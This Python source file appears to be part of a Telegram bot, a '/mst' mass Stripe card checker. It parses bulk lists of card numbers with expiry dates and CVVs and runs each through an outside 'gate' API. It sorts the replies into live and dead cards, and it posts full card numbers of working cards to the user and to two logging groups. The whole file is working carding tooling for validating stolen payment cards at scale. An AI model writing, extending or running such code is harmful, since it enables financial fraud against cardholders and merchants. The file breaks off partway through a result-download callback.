"""
mst.py — /mst Mass Stripe checker (python-telegram-bot v21)

Hit notifications use _send_as_media() from sh.py — sends the premium
animated sticker as a full-size animation + card as caption, in ONE message.
Visible and animated for ALL users regardless of Telegram Premium status.

Architecture:
  • CommandHandler("mst", cmd_mst)
  • CallbackQueryHandler for "mstr:<sid>:<type>"  (download results)
  • CallbackQueryHandler for "msts:<sid>"          (stop session)
"""

import asyncio
import random
import re
import logging
import aiohttp
import time
import string
from datetime import datetime
from typing import Optional, List, Tuple
from io import BytesIO
from html import escape as html_escape

from telegram import Update, InputFile
from telegram.error import BadRequest, Forbidden
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes

from config import (
    OWNER_ID, CHANNEL_LINK, DEV_LINK, BOT_NAME,
    get_bin_info,
    tg_emoji,
    PROG_GATE_EMOJI_ID, PROG_PROGRESS_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, PROG_ERRORS_EMOJI_ID,
    BTN_ALL_EMOJI_ID, BTN_STOP_EMOJI_ID, BTN_LIVE_EMOJI_ID,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID,
    DEV_EMOJI_ID, PRO_EMOJI_ID, HIT_RESP_EMOJI_ID,
    get_random_live_emoji, get_plan_emoji_id,
    RawMarkup, _btn,
)

# Shared sticker-animation sender (one cache for both sh.py and mst.py)
from sh import _send_as_media, _get_sticker_fid

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID          = -1004398328329
EXTRA_CHARGED_GROUP_ID    = -1003991915326
STRIPE_GATE_API_URL       = "https://cardx.up.railway.app/stripe/cc={card}"

MAX_CONCURRENT_CARDS      = 10
CARD_TIMEOUT_SECONDS      = 300
PROGRESS_UPDATE_INTERVAL  = 5.0
CARDS_PER_PROGRESS_UPDATE = 10
SESSION_CLEANUP_SECS      = 1800
COMPLETED_KEEP_SECS       = 86400
BUTTON_LOCK_SECONDS       = 30

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# IN-MEMORY USER STORE  (no database / psycopg2)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_CREDITS: dict = {}   # user_id → int
_PREMIUM: dict = {}   # user_id → bool

def _credits(uid: int) -> int:            return _CREDITS.get(uid, 999999)
def _set_credits(uid: int, n: int) -> None: _CREDITS[uid] = max(0, n)
def _is_premium(uid: int) -> bool:         return _PREMIUM.get(uid, True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION STORAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MST_SESSIONS:  dict = {}
MST_COMPLETED: dict = {}
MST_TASKS:     dict = {}
MST_LOCKS:     dict = {}   # sid → asyncio.Lock  (progress edits)

def _sess(sid: str) -> Optional[dict]:
    return MST_SESSIONS.get(sid) or MST_COMPLETED.get(sid)

def _stopped(sid: str) -> bool:
    s = MST_SESSIONS.get(sid)
    return (not s) or s.get("status") == "STOPPED"

def _is_locked(sid: str) -> bool:
    sess = MST_SESSIONS.get(sid)
    if not sess: return False
    return (time.time() - sess.get("start_time", 0)) < BUTTON_LOCK_SECONDS

def _lock_remaining(sid: str) -> int:
    sess = MST_SESSIONS.get(sid)
    if not sess: return 0
    return max(0, int(BUTTON_LOCK_SECONDS - (time.time() - sess.get("start_time", 0))) + 1)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _classify(resp: str) -> str:
    """Returns: CHARGED | LIVE | DEAD | RETRY"""
    mu = resp.upper()
    ml = resp.lower()

    if any(x in mu for x in (
        "ORDER_PAID", "ORDER PAID", "CHARGED", "CAPTURED",
        "PAYMENT_INTENT.SUCCEEDED", "AMOUNT_CAPTURED",
        "PAYMENT CAPTURED", "CHARGE SUCCEEDED",
        "ORDER PLACED", "ORDER CONFIRMED", "PAYMENT SUCCESSFUL",
    )):
        return "CHARGED"

    if any(x in mu for x in ("3DS_REQUIRED", "3D_SECURE", "3D SECURE", "THREE_D_SECURE")):
        return "LIVE"

    if any(x in mu for x in (
        "INSUFFICIENT_FUNDS", "INCORRECT_CVV", "INCORRECT_CVC",
        "INCORRECT_ZIP", "DO_NOT_HONOR", "DO NOT HONOR",
        "APPROVED", "SUCCESS", "AUTHENTICATED",
        "THANK YOU", "AUTHENTICATION SUCCESSFUL",
    )):
        return "LIVE"

    if any(x in mu for x in (
        "DECLINED", "CARD_DECLINED", "GENERIC_DECLINE",
        "PROCESSING_ERROR", "PICK_UP_CARD", "FRAUD_SUSPECTED",
        "STOLEN", "LOST_CARD", "EXPIRED", "RESTRICTED",
        "TRANSACTION_NOT_ALLOWED", "INVALID_CARD",
        "SECURITY_VIOLATION", "CALL_ISSUER", "BLOCKED",
    )):
        return "DEAD"

    if any(x in ml for x in (
        "connection error", "timeout", "socket", "ssl",
        "rate limit", "too many requests", "service unavailable",
        "gateway timeout", "proxy error", "hcaptcha",
    )):
        return "RETRY"

    return "DEAD"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _safe(t) -> str:
    return html_escape(str(t)) if t else "N/A"

def _user_link(user) -> str:
    name = _safe(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _luhn(n: str) -> bool:
    if not n.isdigit(): return False
    total = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def _fmt_time(elapsed: float) -> str:
    if elapsed >= 60:
        return f"{int(elapsed // 60)}m {int(elapsed % 60)}s"
    return f"{int(elapsed)}s"

def _bin_str(b: dict) -> str:
    if not b: return "N/A"
    sc = str(b.get("scheme", "N/A")).upper()
    bk = b.get("bank", "N/A")
    co = b.get("country", "N/A")
    fl = b.get("country_emoji", "")
    parts = " - ".join(x for x in (sc, bk) if x and x != "N/A")
    country_str = f"{fl} {co}".strip() if fl else co
    return f"{parts} - {country_str}".strip(" -") or "N/A"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _parse_cards(text: str) -> List[Tuple[str, str]]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
    ]
    seen = set(); cards = []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            fmt = f"{cc}|{mm}|{yy}|{cvv}"
            if fmt not in seen and _luhn(cc):
                seen.add(fmt)
                cards.append((fmt, cc))
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RATE LIMITERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class _RL:
    def __init__(self, interval=1.0, burst=3):
        self._interval = interval; self._burst = burst
        self._last = 0.0; self._cnt = 0; self._reset = 0.0
        self._lock = asyncio.Lock()

    async def wait(self):
        async with self._lock:
            now = time.time()
            if now - self._reset > 5.0:
                self._cnt = 0; self._reset = now
            delay = 2.0 if self._cnt >= self._burst else max(0, self._interval - (now - self._last))
            if delay: await asyncio.sleep(delay)
            self._last = time.time(); self._cnt += 1

_RL_HIT  = _RL(1.0, 3)
_RL_DM   = _RL(1.0, 3)
_RL_XTRA = _RL(1.0, 3)
_RL_PROG = _RL(0.5, 10)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STRIPE API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _stripe(card: str) -> dict:
    url = STRIPE_GATE_API_URL.format(card=card)
    try:
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=CARD_TIMEOUT_SECONDS)
        ) as s:
            async with s.get(url) as r:
                if r.status == 200:
                    data = await r.json()
                    return {
                        "status":   data.get("status", "error").lower(),
                        "response": data.get("response", "Unknown"),
                    }
                return {"status": "error", "response": f"HTTP {r.status}"}
    except asyncio.TimeoutError:
        return {"status": "error", "response": "Connection Timed Out"}
    except Exception as e:
        return {"status": "error", "response": f"Connection Error: {str(e)[:50]}"}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD BUILDERS  (coloured buttons with custom emoji)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _kb_running(sid: str, live: int, checked: int) -> RawMarkup:
    return RawMarkup([
        [
            _btn(f"Live ({live})",   cb=f"mstr:{sid}:live", style="success", icon=BTN_LIVE_EMOJI_ID),
            _btn(f"All ({checked})", cb=f"mstr:{sid}:all",  style="primary", icon=BTN_ALL_EMOJI_ID),
        ],
        [_btn("⛔ Stop", cb=f"msts:{sid}", style="danger", icon=BTN_STOP_EMOJI_ID)],
    ])

def _kb_done(sid: str, live: int, total: int) -> RawMarkup:
    return RawMarkup([[
        _btn(f"Live ({live})",  cb=f"mstr:{sid}:live", style="success", icon=BTN_LIVE_EMOJI_ID),
        _btn(f"All ({total})",  cb=f"mstr:{sid}:all",  style="primary", icon=BTN_ALL_EMOJI_ID),
    ]])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS TEXT  — plain emoji visible to ALL users
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _prog_text(sess: dict) -> str:
    elapsed = time.time() - sess["start_time"]
    ts      = _fmt_time(elapsed)
    ul      = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
    dev_url = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
    pe      = sess.get("plan_eid", PRO_EMOJI_ID)
    return (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Stripe | 0$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Live ➛ {sess["live"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➛ {sess["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➛ {sess["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➛ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ul} '
        f'<tg-emoji emoji-id="{pe}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

async def _update_progress(bot, sid: str, force: bool = False):
    sess = MST_SESSIONS.get(sid)
    if not sess: return

    now = time.time()
    if not force and (now - sess.get("last_upd", 0)) < PROGRESS_UPDATE_INTERVAL:
        return

    text = _prog_text(sess)
    if sess.get("last_txt") == text and not force:
        return

    if sid not in MST_LOCKS:
        MST_LOCKS[sid] = asyncio.Lock()

    async with MST_LOCKS[sid]:
        sess = MST_SESSIONS.get(sid)
        if not sess: return
        if sess.get("last_txt") == text and not force:
            return
        running = sess["status"] == "CHECKING"
        kb = (_kb_running(sid, sess["live"], sess["checked"])
              if running else _kb_done(sid, sess["live"], sess["checked"]))
        await _RL_PROG.wait()
        try:
            await bot.edit_message_text(
                chat_id=sess["chat_id"], message_id=sess["msg_id"],
                text=text, parse_mode="HTML", reply_markup=kb,
                disable_web_page_preview=True,
            )
            sess["last_txt"] = text
            sess["last_upd"] = now
        except Exception as e:
            err = str(e).lower()
            if "message is not modified" not in err and "message to edit not found" not in err:
                logging.error(f"[MST] progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
# _send_as_media() → animated sticker + card text in ONE message
# Works for ALL users (no Telegram Premium needed)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _send_hit_notifications(bot, sess: dict, card: str, verdict: str,
                                   resp: str, bin_data: dict, elapsed: float):
    user     = sess.get("user_obj")
    plan_eid = sess.get("plan_eid", PRO_EMOJI_ID)
    ul       = _user_link(user)
    dev_url  = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
    ch_link  = f'<a href="{CHANNEL_LINK}">[❆]</a>'
    ts       = _fmt_time(elapsed)
    safe_r   = _safe(resp)

    # BIN string
    bi = bin_data or {}
    sc = str(bi.get("scheme", "N/A")).upper()
    bk = bi.get("bank", "N/A")
    co = bi.get("country", "N/A")
    fl = bi.get("country_emoji", "")
    bin_country = f"{fl} {co}".strip() if fl else co
    bin_s = _safe(f"{sc} - {bk} - {bin_country}")

    # Each hit uses a fresh random custom emoji from the pool
    live_eid = get_random_live_emoji()

    # Status line — the custom emoji is embedded as <tg-emoji> so it
    # renders as an animated custom emoji sticker for ALL users
    status_line = (
        f'<b>{ch_link} Live '
        f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>'
    )

    # ── Full card for user DM (reference format) ─────────────
    dm_html = (
        f'{status_line}\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{html_escape(card)}</code></b>\n'
        f'<b>Gate ➛ Stripe | 0$</b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> Resp ➛ {safe_r}</b>\n'
        f'<b>Bin ➛ <code>{bin_s}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {ts}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ul} '
        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

    # ── Compact card for log groups ───────────────────────────
    log_html = (
        f'{status_line}\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{html_escape(card)}</code></b>\n'
        f'<b>Gate ➛ Stripe | 0$</b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> Resp ➛ {safe_r}</b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ul} '
        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>'
    )

    # 1. DM — random custom emoji header + full card
    await _RL_DM.wait()
    try:
        await _send_as_media(
            bot, user.id, get_random_live_emoji(),
            caption=dm_html, parse_mode="HTML",
        )
    except (Forbidden, BadRequest) as e:
        logging.warning(f"[MST] DM failed uid={user.id}: {e}")
        try:
            await _send_as_media(
                bot, sess["chat_id"], get_random_live_emoji(),
                caption=dm_html, parse_mode="HTML",
            )
        except Exception:
            pass
    except Exception as e:
        logging.warning(f"[MST] DM error uid={user.id}: {e}")

    # 2. Hit-log group — random custom emoji header + compact card
    await _RL_HIT.wait()
    try:
        await _send_as_media(
            bot, HIT_LOG_GROUP_ID, get_random_live_emoji(),
            caption=log_html, parse_mode="HTML",
        )
    except Exception as e:
        logging.error(f"[MST] hit-log group error: {e}")

    # 3. Extra group — random custom emoji header + compact card
    if EXTRA_CHARGED_GROUP_ID:
        await asyncio.sleep(0.5)
        await _RL_XTRA.wait()
        try:
            await _send_as_media(
                bot, EXTRA_CHARGED_GROUP_ID, get_random_live_emoji(),
                caption=log_html, parse_mode="HTML",
            )
        except Exception as e:
            logging.error(f"[MST] extra group error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _process_card(bot, sid: str, card_fmt: str, cc: str):
    sess = MST_SESSIONS.get(sid)
    if not sess or _stopped(sid): return

    t0 = time.time()

    # BIN lookup (non-blocking, best-effort)
    bin_data = {}
    try:
        bin_data = await asyncio.wait_for(get_bin_info(cc[:6]), timeout=8)
    except Exception:
        pass

    if _stopped(sid): return

    # Gate call
    try:
        result   = await _stripe(card_fmt)
        status   = result.get("status", "error").lower()
        resp_txt = result.get("response", "Unknown")
    except asyncio.CancelledError:
        raise
    except Exception as e:
        status   = "error"
        resp_txt = str(e)[:80]

    if _stopped(sid): return

    elapsed = time.time() - t0
    verdict = _classify(resp_txt)

    card_rec = {
        "card":      card_fmt,
        "response":  resp_txt,
        "status":    status,
        "bin_info":  bin_data or {},
        "timestamp": datetime.now().isoformat(),
    }

    sess = MST_SESSIONS.get(sid)
    if not sess or _stopped(sid): return

    sess["checked"] += 1

    if verdict in ("CHARGED", "LIVE"):
        sess["live"] += 1
        sess.setdefault("live_cards", []).append(card_rec)
        if verdict == "CHARGED":
            uid = sess.get("user_id")
            if uid: _set_credits(uid, _credits(uid) - 1)

        # Notify in-chat immediately — custom emoji sticker + hit label
        _eid = get_random_live_emoji()
        asyncio.create_task(
            _send_as_media(
                bot, sess["chat_id"], _eid,
                caption=(
                    f'<b><tg-emoji emoji-id="{_eid}">⭐</tg-emoji>'
                    f' HIT ➛ LIVE ✅ — Stripe | 0$</b>'
                ),
                parse_mode="HTML", disable_notification=True,
            )
        )
        # Full hit notifications (DM + log group + extra group)
        asyncio.create_task(
            _send_hit_notifications(bot, sess, card_fmt, verdict, resp_txt, bin_data, elapsed)
        )
        # Force progress update on every hit
        try:
            await _update_progress(bot, sid, force=True)
        except Exception:
            pass

    elif verdict == "DEAD":
        sess["dead"] += 1
        sess.setdefault("dead_cards", []).append(card_rec)
        uid = sess.get("user_id")
        if uid: _set_credits(uid, _credits(uid) - 1)

    else:  # ERROR / RETRY
        sess["errors"] += 1
        sess.setdefault("error_cards", []).append(card_rec)

    # Periodic progress update
    if sess["checked"] % CARDS_PER_PROGRESS_UPDATE == 0:
        try:
            await _update_progress(bot, sid)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECKER RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _run_mass(bot, sid: str, cards: list):
    sess = MST_SESSIONS.get(sid)
    if not sess: return

    sem = asyncio.Semaphore(MAX_CONCURRENT_CARDS)

    async def _worker(fmt, cc):
        if _stopped(sid): return
        async with sem:
            if _stopped(sid): return
            try:
                await _process_card(bot, sid, fmt, cc)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logging.error(f"[MST] worker error {fmt}: {e}")
                s = MST_SESSIONS.get(sid)
                if s: s["errors"] += 1
            await asyncio.sleep(1.0)

    tasks = [asyncio.create_task(_worker(fmt, cc)) for fmt, cc in cards]
    MST_TASKS[sid] = tasks

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        sess = MST_SESSIONS.get(sid)
        if sess:
            if sess["status"] != "STOPPED":
                sess["status"] = "FINISHED"
            sess["end_time"] = time.time()

            # Archive to completed
            MST_COMPLETED[sid]                  = dict(sess)
            MST_COMPLETED[sid]["completed_at"]  = time.time()

            # Final progress edit
            try:
                await _update_progress(bot, sid, force=True)
            except Exception:
                pass

            # Completion sticker to the chat (silent)
            try:
                asyncio.create_task(
                    _send_as_media(
                        bot, sess["chat_id"], get_random_live_emoji(),
                        caption=(
                            f"<b>✅ Mass Stripe complete!</b>\n"
                            f"<b>Live ➛ {sess['live']} | Dead ➛ {sess['dead']}</b>"
                        ),
                        parse_mode="HTML", disable_notification=True,
                    )
                )
            except Exception:
                pass

            elapsed = sess["end_time"] - sess["start_time"]
            logging.info(
                f"🏁 [MST] {sid} {sess['status']} — "
                f"L:{sess['live']} D:{sess['dead']} E:{sess['errors']} "
                f"Checked:{sess['checked']}/{sess['total']} Time:{int(elapsed)}s"
            )

        MST_SESSIONS.pop(sid, None)
        MST_TASKS.pop(sid, None)
        MST_LOCKS.pop(sid, None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION CLEANUP  (background task)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_cleanup_started = False

async def _cleanup_loop():
    while True:
        try:
            await asyncio.sleep(120)
            now = time.time()
            old = [
                k for k, v in list(MST_COMPLETED.items())
                if now - v.get("completed_at", now) > COMPLETED_KEEP_SECS
            ]
            for k in old:
                MST_COMPLETED.pop(k, None)
                logging.debug(f"[MST] removed old completed session {k}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logging.error(f"[MST] cleanup error: {e}")

def _ensure_cleanup():
    global _cleanup_started
    if not _cleanup_started:
        _cleanup_started = True
        asyncio.create_task(_cleanup_loop())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _result_file(sess: dict, rtype: str) -> Tuple[BytesIO, str, int]:
    if rtype == "live":
        cards = sess.get("live_cards", [])
        label = "Live"
    else:
        cards = (
            sess.get("live_cards", []) +
            sess.get("dead_cards", []) +
            sess.get("error_cards", [])
        )
        label = "All"

    name = (sess["user_obj"].first_name if sess.get("user_obj") else "User") or "User"
    lines = [
        f"Gate ➛ Stripe | 0$",
        f"Result ➛ {label}",
        f"Total ➛ {len(cards)}",
        "━━━━━━━━━━━━",
    ]
    for c in cards:
        bi   = c.get("bin_info", {})
        sc   = str(bi.get("scheme", "N/A")).upper()
        bk   = bi.get("bank", "N/A")
        co   = bi.get("country", "N/A")
        fl   = bi.get("country_emoji", "")
        lines += [
            f"Card ➛ {c['card']}",
            f"Resp ➛ {c.get('response', 'N/A')}",
            f"Gate ➛ Stripe | 0$",
            f"Brand ➛ {sc}",
            f"Issuer ➛ {bk}",
            f"Country ➛ {fl} {co}".strip(),
            f"User ➛ {name}",
            "━━━━━━━━━━━━",
        ]

    buf = BytesIO("\n".join(lines).encode())
    buf.seek(0)
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn  = f"Batamanchk_MST_{label.upper()}_{ts}.txt"
    return buf, fn, len(cards)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /mst COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid  = user.id
    bot  = context.bot

    if not _is_premium(uid):
        await update.message.reply_text(
            "💎 <b>Premium required for /mst.</b>\n"
            "Contact the owner to upgrade.",
            parse_mode="HTML",
        )
        return

    _ensure_cleanup()

    # Block duplicate active sessions
    for sid, sd in list(MST_SESSIONS.items()):
        if sd.get("user_id") == uid and sd.get("status") == "CHECKING":
            await update.message.reply_text(
                "⚠️ <b>You already have an active /mst session.</b>\n"
                "Use the ⛔ Stop button to cancel it first.",
                parse_mode="HTML",
            )
            return

    # Collect card input
    raw = ""
    msg = update.message
    if context.args:
        raw += " ".join(context.args) + " "
    if msg.reply_to_message:
        rm   = msg.reply_to_message
        raw += (rm.text or rm.caption or "") + " "

    doc = msg.document or (msg.reply_to_message.document if msg.reply_to_message else None)
    if doc:
        if doc.file_size > 3 * 1024 * 1024:
            await msg.reply_text("❌ File too large (max 3 MB).")
            return
        try:
            f    = await doc.get_file()
            data = await f.download_as_bytearray()
            raw += data.decode("utf-8", errors="ignore")
        except Exception as e:
            await msg.reply_text(f"❌ Error reading file: {e}")
            return

    if not raw.strip():
        await msg.reply_text(
            "<b>🛒 Mass Stripe — /mst</b>\n──────────\n"
            "Reply to a <code>.txt</code> file or paste cards inline.\n"
            "Format: <code>cc|mm|yy|cvv</code>",
            parse_mode="HTML",
        )
        return

    cards = _parse_cards(raw)
    if not cards:
        await msg.reply_text(
            "❌ No valid cards found. Use <code>cc|mm|yy|cvv</code>.",
            parse_mode="HTML",
        )
        return
    if len(cards) > 20000:
        cards = cards[:20000]

    total    = len(cards)
    sid      = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    plan_eid = get_plan_emoji_id("ELITE")
    ul       = _user_link(user)
    dev_url  = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'

    init_text = (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Stripe | 0$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ 0/{total}</b>\n'
        f'<b>Live ➛ 0 <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➛ 0 <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➛ 0 <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➛ 0s</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ul} '
        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {dev_url} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

    prog_msg = await msg.reply_text(
        init_text, parse_mode="HTML",
        reply_markup=_kb_running(sid, 0, 0),
        disable_web_page_preview=True,
    )

    MST_SESSIONS[sid] = {
        "status":       "CHECKING",
        "chat_id":      msg.chat.id,
        "user_id":      uid,
        "msg_id":       prog_msg.message_id,
        "user_msg_id":  msg.message_id,
        "total":        total,
        "checked":      0,
        "live":         0,
        "dead":         0,
        "errors":       0,
        "start_time":   time.time(),
        "end_time":     None,
        "last_txt":     "",
        "last_upd":     0,
        "live_cards":   [],
        "dead_cards":   [],
        "error_cards":  [],
        "user_obj":     user,
        "plan_name":    "ELITE",
        "plan_eid":     plan_eid,
        "completed_at": None,
    }

    logging.info(f"🚀 [MST] Started session {sid} — {total} cards — uid={uid}")
    asyncio.create_task(_run_mass(bot, sid, cards))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK: download results
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cb_mst_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    parts = query.data.split(":")   # mstr:<sid>:<type>
    if len(parts) < 3: return

    _, sid, rtype = parts[0], parts[1], parts[2]
    sess = _sess(sid)
    if not sess:
        await query.answer("⚠️ Session not found.", show_alert=True); return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ Not your session.", show_alert=True); return

    # Button lock during first 30s
    if sid in MST_SESSIONS and _is_locked(sid):
        remaining = _lock_remaining(sid)
        await query.answer(f"⏳ Wait {remaining}s before downloading.", show_alert=True); return

    buf, fn, count = _result_file(sess, rtype)
    if count == 0:
        await query.answer(f"❌ No {rtype} cards yet.", show_alert=True); return

    await query.answer("📦 Generating file…")
